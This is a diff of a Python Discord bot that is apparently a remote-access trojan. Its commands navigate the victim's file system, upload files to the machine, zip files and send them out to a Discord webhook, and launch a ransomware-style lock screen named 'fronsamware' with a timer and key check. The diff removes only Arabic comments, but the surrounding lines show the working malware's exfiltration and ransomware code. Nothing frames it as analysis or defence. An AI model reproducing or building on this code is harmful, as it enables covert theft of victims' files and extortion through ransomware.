@@ -98,7 +98,7 @@ async def cd(ctx, *, path):
         new_path = os.path.abspath(os.path.join(current_dir, path))
         if os.path.exists(new_path) and os.path.isdir(new_path):
             current_dir = new_path
-            os.chdir(current_dir)  # مهم جداً
+            os.chdir(current_dir)  
             embed = discord.Embed(description=f"**Changed directory to:**\n {current_dir}", color=0x460496)
             embed.set_author(name="Change Directory💤")
             embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
@@ -209,7 +209,6 @@ async def fronsamware(ctx, cod):
     press_enter.place(relx=0.5, rely=0.498, anchor="center")
     win.bind('<Return>', lambda e: check_key())
 
-    # ---------- تشغيل ----------
     update_timer()
     typer()
     win.mainloop()
@@ -220,7 +219,7 @@ async def fronsamware(ctx, cod):
     
 @client.command()
 async def upload(ctx):
-    # تأكد أن هناك مرفق في الرسالة
+
     if ctx.message.attachments:
         attachment = ctx.message.attachments[0]
         save_path = os.path.join(os.getcwd(), attachment.filename)
@@ -416,7 +415,7 @@ async def download(ctx, *, path):
             }
             res = requests.post(webhook_url, files=files)
 
-        os.remove(zip_path)  # تنظيف الملف
+        os.remove(zip_path)  
 
         if res.status_code in [200, 204]:
             embed = discord.Embed(description=f"**File Was Sended With Success🚬**", color=0x460496)
@@ -610,3 +609,4 @@ async def pwd(ctx):
     await ctx.send(embed=embed)
 
 client.run("Discord Bot Token")
+
